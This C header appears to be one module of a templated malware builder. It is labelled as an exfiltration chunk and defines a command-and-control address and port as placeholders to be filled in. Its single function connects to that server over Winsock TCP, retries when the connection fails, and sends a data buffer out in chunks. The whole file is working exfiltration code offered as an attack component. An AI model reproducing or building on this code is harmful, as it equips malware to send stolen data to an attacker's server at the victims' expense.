// chunk: exfil/tcp_direct
// depends: core/emit_buffer
// provides: exfiltrate
// headers: winsock2.h, ws2tcpip.h
// libs: ws2_32

#ifndef CHUNK_TCP_DIRECT
#define CHUNK_TCP_DIRECT

#include <winsock2.h>
#include <ws2tcpip.h>

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

static BOOL exfiltrate(const char *ip, WORD port, const char *data, DWORD len) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return FALSE;
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) { WSACleanup(); return FALSE; }

    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    int retries = 3;
    while (retries-- > 0) {
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != SOCKET_ERROR)
            break;
        if (retries > 0) { closesocket(sock); Sleep(2000);
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) { WSACleanup(); return FALSE; }
        } else { closesocket(sock); WSACleanup(); return FALSE; }
    }

    DWORD sent = 0;
    while (sent < len) {
        int n = send(sock, data + sent, (len - sent > 32768) ? 32768 : len - sent, 0);
        if (n <= 0) break;
        sent += n;
    }
    closesocket(sock);
    WSACleanup();
    return sent == len;
}

#endif
